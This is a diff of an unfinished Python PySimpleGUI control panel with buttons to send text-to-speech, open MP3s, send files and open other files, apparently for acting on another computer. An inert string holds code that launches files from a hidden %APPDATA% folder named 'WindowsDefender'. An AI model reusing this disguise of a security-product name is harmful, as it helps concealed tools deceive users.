@@ -1,7 +1,8 @@
 
 import PySimpleGUI as sg
-
+import os
 sg.theme('default1')
+
 
 def open_other_files_window():
     layout = [[sg.Text('Enter the file name: '), sg.InputText()],
@@ -13,10 +14,21 @@ def open_other_files_window():
         event, values = window.read()
         if event == "Exit" or event == sg.WIN_CLOSED:
             break
-        # if event == "Open File":
+        if event == "Open File":
+            st1 = '''
+            path = os.path.join(os.getenv('APPDATA'), "WindowsDefender")
+            filename = values[0]
+            file_path = os.path.join(path, filename)
+            os.startfile(file_path) '''
 
     window.close()
 
+
+
+
+
+
+# ================================================================
 def open_send_files_window():
     layout = [[sg.Text('Enter the file directory: '), sg.InputText()],
              [sg.Button("Send File")]]
@@ -27,10 +39,17 @@ def open_send_files_window():
         event, values = window.read()
         if event == "Exit" or event == sg.WIN_CLOSED:
             break
-        # if event == "Send File":
-    
+        if event == "Send File":
+            filename = values[0]
+
     window.close()
 
+
+
+
+
+
+# ===================================================================
 def tts_window():
     layout = [[sg.Text('Wirte your text here: '), sg.InputText()],
              [sg.Button("Send TTS")]]
@@ -45,6 +64,11 @@ def tts_window():
     
     window.close()
 
+
+
+
+
+# ===================================================================
 def open_mp3_window():
     layout = [[sg.Text('enter file name'), sg.InputText()],
              [sg.Button("send")]]
@@ -60,6 +84,11 @@ def open_mp3_window():
     window.close()
 
 
+
+
+
+
+# ===================================================================
 def main():
     layout = [[sg.Button("send tts massege"), sg.Button("open mp3 files"), [sg.Button("send files")], sg.Button("open other files")]]
 
